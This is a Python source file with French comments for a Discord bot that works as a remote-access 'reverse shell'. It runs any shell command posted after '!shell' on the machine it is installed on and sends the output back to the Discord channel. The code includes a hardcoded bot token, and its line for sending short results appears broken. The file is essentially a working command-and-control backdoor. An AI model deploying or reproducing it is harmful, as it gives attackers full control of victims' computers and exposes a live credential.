import os
import subprocess
import discord
import asyncio

TOKEN = "MTM4OTI3NDkzODUyNzE4NzA5NQ.GyXvzY.ApiUxl66F1aWdW5wu6nxS954WnvJpFIXsp4GNU"

# Définition des intents requis
intents = discord.Intents.default()
intents.message_content = True  # Permet de lire le contenu des messages

client = discord.Client(intents=intents)

@client.event
async def on_ready():
    print(f"Connecté en tant que {client.user}")

@client.event
async def on_message(message):
    # Ignore les messages du bot lui-même
    if message.author == client.user:
        return

    # Commande reverse shell
    if message.content.startswith("!shell"):
        command = message.content[7:]  # Enlève "!shell " du début
        if not command.strip():
            await message.channel.send("Syntaxe : !shell <commande>")
            return

        try:
            # Exécute la commande shell
            output = subprocess.run(
                command,
                shell=True,
                capture_output=True,
                text=True
            )
            result = output.stdout + output.stderr
            if not result.strip():
                result = "[*] Commande exécutée, mais aucune sortie."
            # Discord limite les messages à 2000 caractères
            if len(result) > 1900:
                temp_path = os.path.join(os.getenv('TEMP'), "output.txt")
                with open(temp_path, "w", encoding="utf-8") as f:
                    f.write(result)
                file = discord.File(temp_path, filename="output.txt")
                await message.channel.send("[*] Résultat trop long, voir fichier joint :", file=file)
                os.remove(temp_path)
            else:
                await message.channel.send(f"``````")
        except Exception as e:
            await message.channel.send(f"[!] Erreur lors de l'exécution : {e}")

client.run(TOKEN)
